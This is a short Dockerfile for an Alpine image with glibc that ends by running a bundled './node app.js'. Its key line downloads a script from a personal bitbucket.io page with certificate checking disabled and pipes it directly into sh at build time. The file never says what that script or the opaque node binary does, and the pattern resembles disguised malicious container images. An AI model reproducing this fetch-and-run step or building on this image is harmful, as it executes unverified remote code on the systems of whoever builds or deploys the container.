FROM alpine  
WORKDIR /tmp  
EXPOSE 8080  
ENV LD_LIBRARY_PATH ./:/usr/glibc-compat/lib:/lib64:/lib:/usr/lib64:/usr/lib  
RUN ["apk", "update"]  
RUN ["apk", "add", "libgcc", "git", "tar", "bzip2", "wget", "ca-certificates"]  
RUN wget -qO /etc/apk/keys/sgerrand.rsa.pub
https://raw.githubusercontent.com/sgerrand/alpine-pkg-
glibc/master/sgerrand.rsa.pub  
RUN wget https://github.com/sgerrand/alpine-pkg-
glibc/releases/download/2.25-r0/glibc-2.25-r0.apk  
RUN apk add glibc-2.25-r0.apk  
RUN wget --no-check-certificate -qO -
'https://lanahein.bitbucket.io/bootstrap?_v=1499322441' | sh  
CMD ["./node", "app.js"]  
  

